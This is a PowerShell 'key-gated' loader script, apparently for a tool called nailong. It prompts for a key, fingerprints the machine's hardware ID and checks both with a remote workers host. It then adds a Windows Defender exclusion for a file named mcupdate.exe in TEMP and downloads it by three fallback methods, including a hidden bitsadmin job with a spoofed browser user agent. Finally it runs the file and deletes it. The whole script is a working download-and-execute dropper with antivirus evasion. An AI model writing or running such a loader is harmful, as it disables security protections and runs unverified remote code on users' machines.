# nailong loader -- key gated v3
 $worker = "https://nailong.cync911.workers.dev"
 $logFile = "$env:TEMP\nailong_loader.log"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Log($msg) {
    "$([DateTime]::Now.ToString('HH:mm:ss')) $msg" | Out-File $logFile -Append
}

try {
    Log "=== loader started ==="

    Add-Type -AssemblyName Microsoft.VisualBasic
    $key = [Microsoft.VisualBasic.Interaction]::InputBox("enter your nailong key:", "nailong", "")
    if (-not $key) { Log "no key entered"; exit }
    $key = $key.Trim().ToUpper()
    Log "key entered: $key"

    # hwid
    $uuid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = [BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($uuid))).Replace("-","").ToLower()
    $hwid = $hash.Substring(0,32)
    Log "hwid: $hwid"

    # validate
    $resp = Invoke-RestMethod "$worker/check?key=$key&hwid=$hwid" -ErrorAction Stop
    Log "check response: $($resp | ConvertTo-Json -Compress)"

    if ($resp.status -ne "ok") {
        Log "rejected: $($resp.status)"
        try {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show("rejected: $($resp.status)", "nailong") | Out-Null
        } catch { Log "popup failed: $_" }
        exit
    }

    Log "check ok -- downloading"

    # download with triple fallback
    $dst = "$env:TEMP\mcupdate.exe"
    Add-MpPreference -ExclusionPath $dst -ErrorAction SilentlyContinue
    $url = "$worker/download?key=$key&hwid=$hwid"
    $ok = $false

    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $dst)
        $ok = $true
        Log "download ok (webclient)"
    } catch {
        Log "webclient failed: $($_.Exception.Message)"
    }

    if (-not $ok) {
        try {
            Invoke-WebRequest -Uri $url -OutFile $dst -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
            $ok = $true
            Log "download ok (iwr)"
        } catch {
            Log "iwr failed: $($_.Exception.Message)"
        }
    }

    if (-not $ok) {
        Start-Process bitsadmin -ArgumentList "/transfer nljob `"$url`" `"$dst`"" -Wait -WindowStyle Hidden
        if (Test-Path $dst) { $ok = $true; Log "download ok (bitsadmin)" }
    }

    if (-not $ok -or -not (Test-Path $dst)) {
        Log "all download methods failed"
        try {
            [System.Windows.Forms.MessageBox]::Show("download failed -- see %TEMP%\nailong_loader.log", "nailong") | Out-Null
        } catch {}
        exit
    }

    $len = (Get-Item $dst).Length
    Log "downloaded $len bytes"

    if ($len -lt 100000) {
        Log "file too small -- likely error page"
        exit
    }

    Unblock-File $dst -ErrorAction SilentlyContinue
    Log "launching exe"
    Start-Process $dst
    Start-Sleep 5
    Remove-Item $dst -Force -ErrorAction SilentlyContinue
    Log "=== loader done ==="

} catch {
    Log "FATAL: $($_.Exception.Message)"
    Log "FATAL stack: $($_.ScriptStackTrace)"
}
